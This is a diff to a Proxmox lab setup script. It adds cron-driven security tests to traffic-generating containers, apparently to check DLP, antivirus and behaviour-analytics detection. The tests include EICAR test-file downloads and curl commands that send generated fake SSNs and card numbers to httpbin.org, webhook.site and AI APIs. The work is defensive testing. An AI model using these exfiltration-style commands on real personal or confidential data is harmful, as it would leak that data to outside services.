@@ -84,6 +84,7 @@ MEMORY="${MEMORY:-256}"
 CORES="${CORES:-1}"
 CRON_SERVER="${CRON_SERVER:-*/15 * * * *}"
 CRON_OFFICE="${CRON_OFFICE:-*/5 8-18 * * 1-5}"
+CRON_SECURITY="${CRON_SECURITY:-*/30 * * * *}"
 EOF
   echo -e "${GREEN}✓ Settings saved to ~/.proxmox-lab.conf${NC}"
 }
@@ -864,16 +865,16 @@ cmd_stop_containers() {
 # ============================================================
 
 declare -A PROFILE_DESC=(
-  ["fileserver"]="Cloud sync (OneDrive, Dropbox, S3), DLP test scenarios"
+  ["fileserver"]="Cloud sync (OneDrive, Dropbox, S3)"
   ["webapp"]="Payment APIs (Stripe), CDN services, certificate validation"
   ["email"]="Office 365, Google Workspace, spam filters, AV updates"
   ["monitoring"]="Ubuntu repos, Datadog, New Relic, Docker Hub, GitHub"
-  ["devops"]="npm, PyPI, GitHub, Docker Hub, EICAR malware test"
+  ["devops"]="npm, PyPI, GitHub, Docker Hub, GenAI tools"
   ["database"]="AWS RDS, Azure SQL, S3 backups"
   ["office-worker"]="Office 365, Salesforce, Slack, Google Docs, news sites"
-  ["sales"]="Salesforce, LinkedIn, travel booking, Zoom, HubSpot"
-  ["developer"]="GitHub, StackOverflow, npm, PyPI, AWS Console, Docker"
-  ["executive"]="Office 365 (+ after-hours UEBA), WSJ, Bloomberg, Zoom"
+  ["sales"]="Salesforce, LinkedIn, travel booking, Zoom, HubSpot, GenAI tools"
+  ["developer"]="GitHub, StackOverflow, npm, PyPI, AWS Console, GenAI tools"
+  ["executive"]="Office 365, WSJ, Bloomberg, Zoom, GenAI tools"
 )
 
 declare -A DEFAULT_PROFILES=(
@@ -890,8 +891,262 @@ declare -A DEFAULT_PROFILES=(
   [224]="executive"
 )
 
+_default_security_tests_for_profile() {
+  local profile="$1"
+  case "$profile" in
+    fileserver)    echo "dlp-network" ;;
+    devops)        echo "eicar dlp-genai-prompt dlp-genai-file" ;;
+    developer)     echo "eicar dlp-genai-prompt dlp-genai-file" ;;
+    office-worker) echo "policy-violation dlp-genai-prompt" ;;
+    sales)         echo "policy-violation dlp-genai-prompt dlp-genai-file" ;;
+    executive)     echo "ueba dlp-genai-prompt" ;;
+    *)             echo "" ;;
+  esac
+}
+
+_install_security_test() {
+  local ctid=$1
+  local test_name=$2
+
+  pct exec $ctid -- mkdir -p /opt/traffic-gen/security-tests
+
+  case "$test_name" in
+    eicar)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/eicar.sh' <<'EOF'
+#!/bin/bash
+echo "[$(date)] Security test: EICAR download"
+curl -s -m 15 https://malware.wicar.org/data/eicar.com > /dev/null 2>&1 || true
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  curl -s -m 15 https://www.eicar.org/download/eicar.com > /dev/null 2>&1 || true
+fi
+EOF
+      ;;
+
+    dlp-network)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-network.sh' <<'EOF'
+#!/bin/bash
+FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
+FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+echo "[$(date)] DLP test: Network data exfiltration attempt (SSN/CCN)"
+curl -s -m 15 -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "ssn=${FAKE_SSN}&card=${FAKE_CCN}&name=John+Smith" \
+  https://httpbin.org/post > /dev/null 2>&1 || true
+EOF
+      ;;
+
+    dlp-genai-prompt)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-genai-prompt.sh' <<'EOF'
+#!/bin/bash
+FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
+FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+PLATFORMS=("openai" "anthropic" "google")
+PLATFORM="${PLATFORMS[$((RANDOM % 3))]}"
+case "$PLATFORM" in
+  openai)
+    URL="https://api.openai.com/v1/chat/completions"
+    PAYLOAD="{\"model\":\"gpt-4o\",\"messages\":[{\"role\":\"user\",\"content\":\"I need help verifying my identity. My SSN is ${FAKE_SSN} and my credit card is ${FAKE_CCN}. Please confirm my account access.\"}]}"
+    ;;
+  anthropic)
+    URL="https://api.anthropic.com/v1/messages"
+    PAYLOAD="{\"model\":\"claude-3-5-sonnet-20241022\",\"max_tokens\":100,\"messages\":[{\"role\":\"user\",\"content\":\"I need help verifying my identity. My SSN is ${FAKE_SSN} and my credit card is ${FAKE_CCN}. Please confirm my account access.\"}]}"
+    ;;
+  google)
+    URL="https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent"
+    PAYLOAD="{\"contents\":[{\"parts\":[{\"text\":\"I need help verifying my identity. My SSN is ${FAKE_SSN} and my credit card is ${FAKE_CCN}. Please confirm my account access.\"}]}]}"
+    ;;
+esac
+echo "[$(date)] DLP test: Submitting prompt with PII to GenAI API (${PLATFORM})"
+curl -s -m 15 -X POST \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer dlp-test" \
+  -d "$PAYLOAD" "$URL" > /dev/null 2>&1 || true
+EOF
+      ;;
+
+    dlp-genai-file)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-genai-file.sh' <<'EOF'
+#!/bin/bash
+FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
+FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+FAKE_ACCT="$((RANDOM % 900000000 + 100000000))"
+TMPFILE=$(mktemp /tmp/dlp-doc.XXXXXX.txt)
+cat > "$TMPFILE" <<PIIEOF
+CONFIDENTIAL - Employee Financial Record
+========================================
+Name: John Smith
+Employee ID: EMP-$((RANDOM % 9000 + 1000))
+Department: Finance
+Social Security Number: ${FAKE_SSN}
+Credit Card Number: ${FAKE_CCN}
+Bank Account: ${FAKE_ACCT}
+Routing Number: 021000021
+Classification: RESTRICTED
+PIIEOF
+echo "[$(date)] DLP test: Uploading document with PII to GenAI file API"
+curl -s -m 20 -X POST \
+  -H "Authorization: Bearer dlp-test" \
+  -F "purpose=assistants" \
+  -F "file=@${TMPFILE}" \
+  https://api.openai.com/v1/files > /dev/null 2>&1 || true
+rm -f "$TMPFILE"
+EOF
+      ;;
+
+    dlp-genai-image)
+      pct exec $ctid -- apk add --quiet imagemagick 2>/dev/null || true
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/dlp-genai-image.sh' <<'EOF'
+#!/bin/bash
+# Requires imagemagick (installed by proxmox-lab.sh)
+FAKE_SSN="$((RANDOM % 900 + 100))-$((RANDOM % 90 + 10))-$((RANDOM % 9000 + 1000))"
+FAKE_CCN="4111$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))$((RANDOM % 9000 + 1000))"
+TMPIMG=$(mktemp /tmp/dlp-img.XXXXXX.png)
+TMPJSON=$(mktemp /tmp/dlp-req.XXXXXX.json)
+convert -size 500x180 xc:white \
+  -font DejaVu-Sans -pointsize 14 -fill black \
+  -draw "text 20,30 'CONFIDENTIAL - Employee Record'" \
+  -draw "text 20,60 'Name: John Smith'" \
+  -draw "text 20,85 'SSN: ${FAKE_SSN}'" \
+  -draw "text 20,110 'Credit Card: ${FAKE_CCN}'" \
+  -draw "text 20,135 'Classification: RESTRICTED'" \
+  "$TMPIMG" 2>/dev/null
+if [ ! -s "$TMPIMG" ]; then
+  echo "[$(date)] GenAI OCR DLP: imagemagick unavailable, skipping"
+  rm -f "$TMPIMG" "$TMPJSON"
+  exit 0
+fi
+IMGDATA=$(base64 -w 0 "$TMPIMG" 2>/dev/null || base64 "$TMPIMG" 2>/dev/null)
+cat > "$TMPJSON" <<JSONEOF
+{"model":"gpt-4o","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"data:image/png;base64,${IMGDATA}"}},{"type":"text","text":"Can you read and summarize this document?"}]}]}
+JSONEOF
+echo "[$(date)] DLP test: Uploading image with PII to GenAI vision API (OCR)"
+curl -s -m 30 -X POST \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer dlp-test" \
+  -d @"$TMPJSON" \
+  https://api.openai.com/v1/chat/completions > /dev/null 2>&1 || true
+rm -f "$TMPIMG" "$TMPJSON"
+EOF
+      ;;
+
+    policy-violation)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/policy-violation.sh' <<'EOF'
+#!/bin/bash
+TARGETS=(
+  "https://www.dropbox.com"
+  "https://wetransfer.com"
+  "https://www.box.com"
+  "https://mega.nz"
+)
+TARGET="${TARGETS[$((RANDOM % ${#TARGETS[@]}))]}"
+echo "[$(date)] Policy test: Attempting access to blocked site (${TARGET})"
+curl -s -m 10 "$TARGET" > /dev/null 2>&1 || true
+EOF
+      ;;
+
+    ueba)
+      pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/security-tests/ueba.sh' <<'EOF'
+#!/bin/bash
+source /opt/traffic-gen/utils/business-hours.sh 2>/dev/null || true
+source /opt/traffic-gen/utils/random-timing.sh 2>/dev/null || true
+# UEBA: only fire after business hours — that is the anomaly
+if is_business_hours; then
+  exit 0
+fi
+echo "[$(date)] UEBA test: After-hours access simulation"
+curl -s -m 10 https://outlook.office365.com > /dev/null 2>&1
+sleep $(random_delay 5 15)
+curl -s -m 10 https://teams.microsoft.com > /dev/null 2>&1
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  curl -s -m 10 https://sharepoint.com > /dev/null 2>&1
+fi
+if [ $((RANDOM % 3)) -eq 0 ]; then
+  curl -s -m 10 https://portal.azure.com > /dev/null 2>&1
+fi
+EOF
+      ;;
+  esac
+
+  pct exec $ctid -- chmod +x /opt/traffic-gen/security-tests/${test_name}.sh
+}
+
+_add_security_test_cron() {
+  local ctid=$1
+  local cron_schedule=$2
+  pct exec $ctid -- bash -c "
+    existing=\$(crontab -l 2>/dev/null | grep -v 'run-security-tests' || true)
+    printf '%s\n%s\n' \"\$existing\" '${cron_schedule} /opt/traffic-gen/run-security-tests.sh' | crontab -
+  "
+}
+
 _install_framework() {
   local ctid=$1
+
+  pct exec $ctid -- mkdir -p /opt/traffic-gen/security-tests
+
+  pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/run-security-tests.sh' <<'EOF'
+#!/bin/bash
+# Security test dispatcher — runs all enabled security tests
+TESTS_DIR="/opt/traffic-gen/security-tests"
+[ -d "$TESTS_DIR" ] || exit 0
+for test_script in "$TESTS_DIR"/*.sh; do
+  [ -f "$test_script" ] && bash "$test_script" 2>&1 | logger -t "security-test" || true
+done
+EOF
+
+  pct exec $ctid -- chmod +x /opt/traffic-gen/run-security-tests.sh
+
+  pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/utils/genai.sh' <<'EOF'
+#!/bin/bash
+# GenAI traffic utilities — realistic enterprise AI usage simulation
+
+GENAI_PROMPTS=(
+  "Summarize the key points of our Q3 financial performance for the board"
+  "Draft a professional email declining a vendor proposal politely"
+  "What are best practices for implementing zero-trust network architecture"
+  "Help me prepare talking points for a client presentation on data security"
+  "What are the main enterprise AI adoption trends this year"
+  "Write a brief project status update for executive stakeholders"
+  "Explain the ROI calculation methodology for cloud migration projects"
+  "Suggest agenda items for a quarterly business review meeting"
+  "What are the key compliance requirements for handling PII data"
+  "Summarize best practices for generative AI governance in enterprises"
+  "Draft a job description for a senior cloud security architect"
+  "What security controls should I implement for a hybrid cloud deployment"
+)
+
+genai_random_prompt() {
+  echo "${GENAI_PROMPTS[$((RANDOM % ${#GENAI_PROMPTS[@]}))]}"
+}
+
+genai_browse() {
+  # Browse public GenAI platform pages (no CoPilot — websockets not supported)
+  local platforms=(
+    "https://chat.openai.com"
+    "https://claude.ai"
+    "https://gemini.google.com"
+    "https://huggingface.co/chat"
+    "https://www.perplexity.ai"
+    "https://poe.com"
+  )
+  local platform="${platforms[$((RANDOM % ${#platforms[@]}))]}"
+  local ua=$(random_user_agent)
+  echo "[$(date)] GenAI: Browsing ${platform}"
+  curl -s -A "$ua" -m 10 -L "$platform" > /dev/null 2>&1 || true
+}
+
+genai_api_call() {
+  local prompt="${1:-What are best practices for enterprise security}"
+  # HuggingFace anonymous inference API — free tier, no auth required for basic models
+  # Zscaler inspects the outbound prompt regardless of rate-limit response
+  echo "[$(date)] GenAI: API call — ${prompt:0:60}..."
+  curl -s -m 15 \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d "{\"inputs\": \"${prompt}\"}" \
+    https://api-inference.huggingface.co/models/distilgpt2 > /dev/null 2>&1 || true
+}
+EOF
 
   pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/traffic-gen.sh' <<'EOF'
 #!/bin/bash
@@ -1001,12 +1256,7 @@ backup_to_cloud() {
   # Dropbox sync
   curl -s -A "DropboxSync/2.0" https://www.dropbox.com > /dev/null 2>&1
 
-  # DLP trigger - simulated sensitive data upload
-  if [ $((RANDOM % 10)) -eq 0 ]; then
-    echo "[$(date)] File server: Uploading file with sensitive data (DLP test)"
-    curl -s -X POST -d "ssn=123-45-6789&ccn=4111111111111111" \
-      https://webhook.site/test > /dev/null 2>&1 || true
-  fi
+  # (DLP tests handled by security-tests/dlp-network.sh if enabled)
 }
 
 # Nightly backup (2-4 AM)
@@ -1100,6 +1350,7 @@ EOF
       pct exec $ctid -- bash -c 'cat > /opt/traffic-gen/profiles/devops.sh' <<'EOF'
 #!/bin/bash
 source /opt/traffic-gen/utils/random-timing.sh
+source /opt/traffic-gen/utils/genai.sh 2>/dev/null || true
 
 echo "[$(date)] DevOps: Build pipeline activity"
 
@@ -1117,11 +1368,14 @@ curl -s https://api.github.com > /dev/null 2>&1
 # Docker Hub
 curl -s https://hub.docker.com > /dev/null 2>&1
 
-# Occasional risky download (supply chain test)
-if [ $((RANDOM % 30)) -eq 0 ]; then
-  echo "[$(date)] DevOps: Testing suspicious download"
-  curl -s https://malware.wicar.org/data/eicar.com > /dev/null 2>&1 || true
+# GenAI — devops uses AI for automation scripts and documentation
+if [ $((RANDOM % 3)) -eq 0 ]; then
+  genai_browse
 fi
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  genai_api_call "$(genai_random_prompt)"
+fi
+# (AV/EICAR tests handled by security-tests/eicar.sh if enabled)
 EOF
       ;;
 
@@ -1215,11 +1469,7 @@ else
   curl -s https://docs.google.com > /dev/null 2>&1
   browse_random "$DOMAINS" 2
 
-  # Random policy violation (10% chance)
-  if [ $((RANDOM % 10)) -eq 0 ]; then
-    echo "[$(date)] Office worker: Policy violation attempt"
-    curl -s https://www.dropbox.com > /dev/null 2>&1 || true
-  fi
+  # (Policy violation tests handled by security-tests/policy-violation.sh if enabled)
 fi
 EOF
       ;;
@@ -1229,6 +1479,7 @@ EOF
 #!/bin/bash
 source /opt/traffic-gen/utils/business-hours.sh
 source /opt/traffic-gen/utils/random-timing.sh
+source /opt/traffic-gen/utils/genai.sh 2>/dev/null || true
 
 if ! is_business_hours; then
   exit 0
@@ -1251,6 +1502,12 @@ curl -s https://zoom.us > /dev/null 2>&1
 
 # Marketing automation
 curl -s https://www.hubspot.com > /dev/null 2>&1
+
+# GenAI — sales uses AI to draft outreach, research prospects, prep for calls
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  genai_browse
+fi
+genai_api_call "$(genai_random_prompt)"
 EOF
       ;;
 
@@ -1259,6 +1516,7 @@ EOF
 #!/bin/bash
 source /opt/traffic-gen/utils/business-hours.sh
 source /opt/traffic-gen/utils/random-timing.sh
+source /opt/traffic-gen/utils/genai.sh 2>/dev/null || true
 
 if ! is_business_hours; then
   # Devs work late sometimes
@@ -1289,6 +1547,12 @@ curl -s https://console.aws.amazon.com > /dev/null 2>&1
 
 # Docker
 curl -s https://hub.docker.com > /dev/null 2>&1
+
+# GenAI — developers are heavy AI coding assistant users
+genai_api_call "$(genai_random_prompt)"
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  genai_browse
+fi
 EOF
       ;;
 
@@ -1320,17 +1584,13 @@ EOF
 #!/bin/bash
 source /opt/traffic-gen/utils/business-hours.sh
 source /opt/traffic-gen/utils/random-timing.sh
+source /opt/traffic-gen/utils/genai.sh 2>/dev/null || true
 
 DOMAINS=/opt/traffic-gen/domains/executive.txt
 
 if ! is_business_hours; then
-  # Execs check email at odd hours (UEBA trigger)
-  if [ $((RANDOM % 2)) -eq 0 ]; then
-    echo "[$(date)] Executive: After-hours email (UEBA target)"
-    curl -s https://outlook.office365.com > /dev/null 2>&1
-    browse_random "$DOMAINS" 1
-  fi
   exit 0
+  # (After-hours UEBA handled by security-tests/ueba.sh if enabled)
 fi
 
 echo "[$(date)] Executive: Light usage pattern"
@@ -1343,6 +1603,12 @@ sleep $(random_delay 15 45)
 curl -s https://www.wsj.com > /dev/null 2>&1
 curl -s https://www.bloomberg.com > /dev/null 2>&1
 browse_random "$DOMAINS" 3
+
+# GenAI — executives use AI for briefings, summaries, and drafting comms
+genai_browse
+if [ $((RANDOM % 2)) -eq 0 ]; then
+  genai_api_call "$(genai_random_prompt)"
+fi
 
 # Video conferencing
 curl -s https://zoom.us > /dev/null 2>&1
@@ -1518,6 +1784,100 @@ cmd_install_traffic_gen() {
     3) INSTALL_FRAMEWORK=false; INSTALL_PROFILES=true; ENABLE_CRON=false ;;
   esac
 
+  # 4. Security Test Configuration
+  echo ""
+  echo -e "${BLUE}4. Security Test Configuration${NC}"
+  echo "Security tests run alongside normal traffic on a separate cron schedule."
+  echo "They generate targeted security events detectable by your security stack."
+  echo ""
+  printf "  %-22s %s\n" "eicar"             "AV — EICAR test file download"
+  printf "  %-22s %s\n" "dlp-network"       "DLP — POST fake SSN/CCN to HTTPS endpoint"
+  printf "  %-22s %s\n" "dlp-genai-prompt"  "DLP — Prompt with embedded PII to AI API (OpenAI/Anthropic/Google)"
+  printf "  %-22s %s\n" "dlp-genai-file"    "DLP — Document upload with PII to AI file API"
+  printf "  %-22s %s\n" "dlp-genai-image"   "DLP — Image with PII to AI vision API (OCR, installs imagemagick)"
+  printf "  %-22s %s\n" "policy-violation"  "Policy — Access blocked apps (Dropbox, WeTransfer, Mega)"
+  printf "  %-22s %s\n" "ueba"              "UEBA — After-hours access simulation"
+  echo ""
+  echo "  1) Recommended defaults (matched to container profiles)"
+  echo "  2) All tests on all selected containers"
+  echo "  3) Custom selection"
+  echo "  4) No security tests"
+  read -p "Select [1-4] (default: 4): " sec_choice
+
+  declare -A SECURITY_TESTS=()
+  ENABLE_SECURITY_TESTS=false
+  CRON_SECURITY="${CRON_SECURITY:-*/30 * * * *}"
+
+  case "${sec_choice:-4}" in
+    1)
+      ENABLE_SECURITY_TESTS=true
+      for CTID in "${!TARGET_PROFILES[@]}"; do
+        PROFILE="${TARGET_PROFILES[$CTID]}"
+        TESTS=$(_default_security_tests_for_profile "$PROFILE")
+        [ -n "$TESTS" ] && SECURITY_TESTS[$CTID]="$TESTS"
+      done
+      echo ""
+      echo -e "${CYAN}Recommended security tests per container:${NC}"
+      for CTID in $(echo "${!SECURITY_TESTS[@]}" | tr ' ' '\n' | sort -n); do
+        echo "  CT ${CTID} (${TARGET_PROFILES[$CTID]}): ${SECURITY_TESTS[$CTID]}"
+      done
+      ;;
+
+    2)
+      ENABLE_SECURITY_TESTS=true
+      ALL_TESTS="eicar dlp-network dlp-genai-prompt dlp-genai-file dlp-genai-image policy-violation ueba"
+      for CTID in "${!TARGET_PROFILES[@]}"; do
+        SECURITY_TESTS[$CTID]="$ALL_TESTS"
+      done
+      echo ""
+      echo "All security tests will be installed on all selected containers."
+      echo -e "${YELLOW}Note: imagemagick will be installed on all containers for the OCR test.${NC}"
+      ;;
+
+    3)
+      ENABLE_SECURITY_TESTS=true
+      echo ""
+      echo "For each test, enter CTIDs to enable it on (space-separated), 'all', or Enter to skip."
+      echo ""
+      for test_name in eicar dlp-network dlp-genai-prompt dlp-genai-file dlp-genai-image policy-violation ueba; do
+        case "$test_name" in
+          eicar)             desc="AV — EICAR test file download" ;;
+          dlp-network)       desc="DLP — POST fake SSN/CCN to HTTPS endpoint" ;;
+          dlp-genai-prompt)  desc="DLP — Prompt with embedded PII to AI API" ;;
+          dlp-genai-file)    desc="DLP — Document upload with PII to AI file API" ;;
+          dlp-genai-image)   desc="DLP — Image with PII to AI vision API (OCR, installs imagemagick)" ;;
+          policy-violation)  desc="Policy — Access blocked apps" ;;
+          ueba)              desc="UEBA — After-hours access simulation" ;;
+        esac
+        echo -e "  ${CYAN}${test_name}${NC} — ${desc}"
+        read -p "  Enable on CTIDs (or 'all', Enter to skip): " ctid_input
+        if [ "$ctid_input" = "all" ]; then
+          for CTID in "${!TARGET_PROFILES[@]}"; do
+            SECURITY_TESTS[$CTID]="${SECURITY_TESTS[$CTID]:-} ${test_name}"
+          done
+        elif [ -n "$ctid_input" ]; then
+          for ctid in $ctid_input; do
+            if [ -n "${TARGET_PROFILES[$ctid]:-}" ]; then
+              SECURITY_TESTS[$ctid]="${SECURITY_TESTS[$ctid]:-} ${test_name}"
+            else
+              echo -e "    ${YELLOW}CT ${ctid} not in target set, skipped${NC}"
+            fi
+          done
+        fi
+      done
+      ;;
+
+    4|*)
+      ENABLE_SECURITY_TESTS=false
+      echo "No security tests will be installed."
+      ;;
+  esac
+
+  if $ENABLE_SECURITY_TESTS && [ ${#SECURITY_TESTS[@]} -gt 0 ]; then
+    echo ""
+    read_with_default "Security test cron schedule" "${CRON_SECURITY:-*/30 * * * *}" "CRON_SECURITY"
+  fi
+
   # Summary
   section_header "Installation Summary"
   echo "Containers:      ${#TARGET_PROFILES[@]}"
@@ -1526,17 +1886,25 @@ cmd_install_traffic_gen() {
   echo "Office Schedule: ${CRON_OFFICE}"
   echo ""
   echo "Installation mode:"
-  [ "$INSTALL_FRAMEWORK" = true ] && echo "  ✓ Install framework"
+  [ "$INSTALL_FRAMEWORK" = true ] && echo "  ✓ Install framework (includes genai.sh, run-security-tests.sh)"
   [ "$INSTALL_PROFILES" = true ] && echo "  ✓ Install profiles"
   [ "$ENABLE_CRON" = true ] && echo "  ✓ Enable automatic traffic generation"
   [ "$ENABLE_CRON" = false ] && echo "  ○ Manual start only (no cron)"
+  if $ENABLE_SECURITY_TESTS && [ ${#SECURITY_TESTS[@]} -gt 0 ]; then
+    echo "  ✓ Security tests (${CRON_SECURITY})"
+  else
+    echo "  ○ No security tests"
+  fi
 
   echo ""
   echo -e "${CYAN}Container assignments:${NC}"
-  for CTID in "${!TARGET_PROFILES[@]}"; do
+  for CTID in $(echo "${!TARGET_PROFILES[@]}" | tr ' ' '\n' | sort -n); do
     PROFILE="${TARGET_PROFILES[$CTID]}"
     echo "  CT ${CTID}: ${PROFILE}"
     echo "    → ${PROFILE_DESC[$PROFILE]}"
+    if $ENABLE_SECURITY_TESTS && [ -n "${SECURITY_TESTS[$CTID]:-}" ]; then
+      echo "    → Security tests: ${SECURITY_TESTS[$CTID]}"
+    fi
   done
 
   echo ""
@@ -1580,28 +1948,45 @@ cmd_install_traffic_gen() {
       fi
     fi
 
+    if $ENABLE_SECURITY_TESTS && [ -n "${SECURITY_TESTS[$CTID]:-}" ]; then
+      echo "  → Installing security tests..."
+      for test in ${SECURITY_TESTS[$CTID]}; do
+        echo "    • ${test}"
+        _install_security_test $CTID $test
+      done
+      _add_security_test_cron $CTID "$CRON_SECURITY"
+    fi
+
     echo -e "${GREEN}  ✓ CT ${CTID} configured successfully${NC}"
   done
 
   section_header "✓ Installation Complete"
   echo "Configured containers: ${#TARGET_PROFILES[@]}"
   echo "Traffic intensity: ${INTENSITY}"
+  if $ENABLE_SECURITY_TESTS && [ ${#SECURITY_TESTS[@]} -gt 0 ]; then
+    echo "Security test schedule: ${CRON_SECURITY}"
+  fi
 
   if $ENABLE_CRON; then
     echo ""
     echo "Traffic generation is ENABLED and will run automatically"
     echo ""
     echo "Useful commands:"
-    echo "  View cron:    pct exec <CTID> -- crontab -l"
-    echo "  View logs:    pct exec <CTID> -- tail -f /var/log/messages"
-    echo "  Manual run:   pct exec <CTID> -- /opt/traffic-gen/traffic-gen.sh <profile>"
-    echo "  Disable cron: pct exec <CTID> -- crontab -r"
+    echo "  View cron:         pct exec <CTID> -- crontab -l"
+    echo "  View logs:         pct exec <CTID> -- tail -f /var/log/messages"
+    echo "  Run profile:       pct exec <CTID> -- /opt/traffic-gen/traffic-gen.sh <profile>"
+    echo "  Run security test: pct exec <CTID> -- /opt/traffic-gen/run-security-tests.sh"
+    echo "  Run single test:   pct exec <CTID> -- bash /opt/traffic-gen/security-tests/<test>.sh"
+    echo "  Disable cron:      pct exec <CTID> -- crontab -r"
   else
     echo ""
     echo "Traffic generation is DISABLED (manual mode)"
     echo ""
     echo "To start manually:"
     echo "  pct exec <CTID> -- /opt/traffic-gen/traffic-gen.sh <profile>"
+    echo ""
+    echo "To run security tests manually:"
+    echo "  pct exec <CTID> -- /opt/traffic-gen/run-security-tests.sh"
     echo ""
     echo "To enable automatic traffic:"
     echo "  Re-run install (option 4) and choose 'Full install' mode"
